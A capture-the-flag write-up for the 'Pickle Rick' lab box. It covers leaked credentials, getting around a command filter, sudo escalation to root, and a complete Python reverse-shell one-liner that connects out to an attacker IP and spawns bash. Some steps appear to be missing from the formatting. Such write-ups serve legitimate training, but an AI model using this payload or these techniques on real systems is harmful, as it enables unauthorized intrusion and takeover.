Pickle Rick is a small Linux web box. The site leaks a username in an HTML comment and a password in robots.txt. After login, a command panel runs shell commands as www-data but blocks cat, so I turn it into a reverse shell. For the last ingredient, www-data can run any command as root with no password.

9Start a listener and send a reverse shell

On my machine I start a listener:

In the command panel I send a Python reverse shell (revshells.com, Python3 #2):

web · command panel
> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.137.189",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
Why it works

The filter only checks the text typed into the panel. Python is not blocked, and it opens a socket to me with bash attached. In that shell there is no filter, so cat works again.

#Q3. What is the last ingredient?

1Try to open /root

The three /snap copies come from read-only snap images and are normal. SUID on sudo is normal too, so this tells me nothing about my sudo rights.

3List my sudo rights

www-data can run any command as root with no password.

Why it works

sudo follows the sudoers rules, not the file permissions. A NOPASSWD: ALL rule for the web user means any command injection on the site is already full root.
